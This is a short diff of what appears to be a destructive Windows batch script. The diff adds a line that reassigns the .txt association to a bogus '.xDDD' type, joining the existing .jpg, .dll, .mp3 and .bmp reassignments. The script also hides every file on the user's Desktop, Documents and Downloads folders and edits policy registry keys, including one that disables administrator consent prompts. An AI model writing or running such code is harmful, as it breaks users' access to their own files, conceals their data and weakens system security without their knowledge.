@@ -14,6 +14,7 @@ assoc .jpg=.xDDD
 assoc .dll=.xDDD
 assoc .mp3=.xDDD
 assoc .bmp=.xDDD
+assoc .txt=.xDDD
 attrib +h +s "%USERPROFILE%\Desktop\*" /s /d
 attrib +h +s "%USERPROFILE%\Documents\*" /s /d  
 attrib +h +s "%USERPROFILE%\Downloads\*" /s /d
@@ -81,4 +82,5 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Ena
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "UndockWithoutLogon" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ScRemoveOption" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
+
 
